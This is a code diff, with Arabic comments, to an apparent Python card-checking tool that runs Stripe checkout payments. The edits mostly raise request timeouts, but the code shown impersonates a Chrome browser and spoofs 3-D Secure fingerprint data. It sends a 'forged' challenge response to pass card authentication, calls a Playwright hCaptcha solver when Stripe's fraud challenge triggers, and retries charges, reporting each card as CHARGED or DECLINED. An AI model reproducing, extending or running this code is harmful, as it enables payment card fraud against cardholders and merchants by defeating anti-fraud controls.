@@ -92,7 +92,6 @@ def find_source_recursive(obj, depth=0, max_depth=12):
             if r: return r
     return None
 
-# --- دالة المتصفح لحل الكابتشا (تشتغل بس لو Stripe طلبها) ---
 async def _run_playwright_hcaptcha(checkout_url, rqdata=None, sitekey=None):
     if not sitekey: return None
     hc_file_path = "hc_script.js"
@@ -182,7 +181,8 @@ class StripeSession:
         if not self.pk or not self.cs: return False, "missing cs/pk"
         
         if self.session: await self.session.close()
-        self.session = AsyncSession(impersonate="chrome", timeout=15)
+        # وقت انتظار متوازن 30 ثانية
+        self.session = AsyncSession(impersonate="chrome", timeout=30)
         
         try:
             body = f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url"
@@ -219,7 +219,7 @@ class StripeSession:
             "guid": self.tracking["guid"], "muid": self.tracking["muid"], "sid": self.tracking["sid"], "key": self.pk,
         }
         try:
-            r = await self.session.post("https://api.stripe.com/v1/payment_methods", data=data, headers=self._hdrs(), timeout=15)
+            r = await self.session.post("https://api.stripe.com/v1/payment_methods", data=data, headers=self._hdrs(), timeout=30)
             j = r.json()
             if "error" in j:
                 e = j["error"]; return None, (e.get("decline_code") or e.get("code") or "token_failed"), e.get("message", "")
@@ -240,8 +240,8 @@ class StripeSession:
             method_obj = {"threeDSServerTransID": stid, "threeDSMethodNotificationURL": notify_url}
             method_b64 = b64e(json.dumps(method_obj, separators=(",", ":")).encode())
             try:
-                await self.session.post(method_url, data=urlencode({"threeDSMethodData": method_b64}), headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA}, timeout=10)
-                await self.session.post(notify_url, data=urlencode({"threeDSMethodData": method_b64}), headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA}, timeout=10)
+                await self.session.post(method_url, data=urlencode({"threeDSMethodData": method_b64}), headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA}, timeout=20)
+                await self.session.post(notify_url, data=urlencode({"threeDSMethodData": method_b64}), headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA}, timeout=20)
             except: pass
             await asyncio.sleep(0.5)
             
@@ -250,7 +250,7 @@ class StripeSession:
             data = {"key": self.pk, "source": src, "client_secret": cs_secret, "payment_user_agent": SJUA, "one_click_authn": "false", "challenge_window_size": "05", "three_d_secure_2[device_render_options][sdk_interface]": "03", "three_d_secure_2[device_render_options][sdk_ui_type][0]": "01", "three_d_secure_2[three_ds_comp_ind]": "Y", "browser[fingerprintAttempted]": "true", "browser[challengeWindowSize]": "05", "browser[threeDSCompInd]": "Y", "browser[browserJavaEnabled]": "false", "browser[browserJavascriptEnabled]": "true", "browser[browserLanguage]": "en-US", "browser[browserColorDepth]": "24", "browser[browserScreenHeight]": "1080", "browser[browserScreenWidth]": "1920", "browser[browserTZ]": "-300", "browser[browserUserAgent]": UA, "browser[browserAcceptHeader]": "text/html,*/*;q=0.8"}
             hdr = {"accept":"application/json","content-type":"application/x-www-form-urlencoded","origin":"https://js.stripe.com","referer":"https://js.stripe.com/","user-agent":UA,"stripe-version":STRIPE_VER}
             try:
-                r = await self.session.post("https://api.stripe.com/v1/3ds2/authenticate", data=data, headers=hdr, timeout=15)
+                r = await self.session.post("https://api.stripe.com/v1/3ds2/authenticate", data=data, headers=hdr, timeout=30)
                 res = r.json()
                 st = res.get("status") or res.get("state", "")
                 if st in ("succeeded","requires_capture"):
@@ -270,7 +270,7 @@ class StripeSession:
                     cres_b64 = b64e(json.dumps(forged, separators=(",", ":")).encode())
                     
                     comp_body = {"key": self.pk, "source": src, "cres": cres_b64, "challenge_window_size": "05"}
-                    cr = await self.session.post("https://api.stripe.com/v1/3ds2/challenge_complete", data=urlencode(comp_body), headers=hdr, timeout=12)
+                    cr = await self.session.post("https://api.stripe.com/v1/3ds2/challenge_complete", data=urlencode(comp_body), headers=hdr, timeout=20)
                     if cr.json().get("status") == "succeeded":
                          return {"success": True, "status": "CHARGED", "message": "3DS Challenge OK", "raw": cr.json()}
             except Exception: pass
@@ -299,13 +299,12 @@ class StripeSession:
             if checksum: data["init_checksum"] = checksum
             if total > 0: data["expected_amount"] = total
                 
-            r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", data=data, headers=self._hdrs(), timeout=20)
+            r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", data=data, headers=self._hdrs(), timeout=30)
             j = r.json()
             res["response_time"] = time.time() - t0
             
             if "error" in j:
                 err = j["error"]
-                # لو Stripe طلب كابتشا حقيقية، هنا بنشغل المتصفح
                 if "intent_confirmation_challenge" in str(err).lower():
                     log("WAF Detected! Calling Playwright...", C.GOLD)
                     site_key = self.init_json.get("passive_captcha", {}).get("site_key", HCK)
@@ -316,7 +315,7 @@ class StripeSession:
                         v_r = await self.session.post(f"https://api.stripe.com/v1/payment_intents/{err.get('payment_intent', {}).get('id')}/verify_challenge", data=v_body, headers=self._hdrs())
                         j = v_r.json()
                         if "error" not in j:
-                            return await self.charge(card) # إعادة المحاولة بعد الكابتشا
+                            return await self.charge(card)
                 
                 res["status"] = "DECLINED"
                 res["message"] = f"{err.get('code', '').upper()}: {err.get('message', '')}"
